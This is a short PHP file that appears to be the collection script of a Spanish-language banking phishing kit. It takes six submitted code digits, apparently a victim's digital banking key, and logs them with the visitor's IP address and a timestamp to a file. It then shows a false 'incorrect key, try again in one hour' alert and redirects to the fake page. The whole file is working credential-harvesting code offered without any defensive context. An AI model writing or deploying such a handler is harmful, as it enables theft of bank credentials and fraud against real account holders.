<?php
@ini_set("display_errors", 0);
@session_start();
@$userp = $_SERVER['REMOTE_ADDR'];

////////////////////


if ( isset ($_POST['num1']) && isset ($_POST['num2']) && isset ($_POST['num3']) && isset ($_POST['num4']) && isset ($_POST['num5']) && isset ($_POST['num6'])){

$_SESSION['ind2'] = "ind2"; 
    $file = fopen("archivo.php", "a");
fwrite($file, "<br>Cod2: ".$_POST['num1']." ".$_POST['num2']."  ".$_POST['num3']."  ".$_POST['num4']."  ".$_POST['num5']." ".$_POST['num6']." - IP ".$userp ." - Fecha: ".date('Y-m-d')." - ".date('H:i:s')." - ".$cc." ".$userp." " . PHP_EOL);
fwrite($file, "<br>*********************************<br>" . PHP_EOL);
fclose($file);

echo '<script language="javascript">alert("CLAVE DIGITAL INCORRECTA\r\nIntente de nuevo en 1 hora.");</script>';
echo '<script type="text/javascript">window.location.href = "index.html";</script>';
}else{ header ('location: index.html'); exit(); }

?>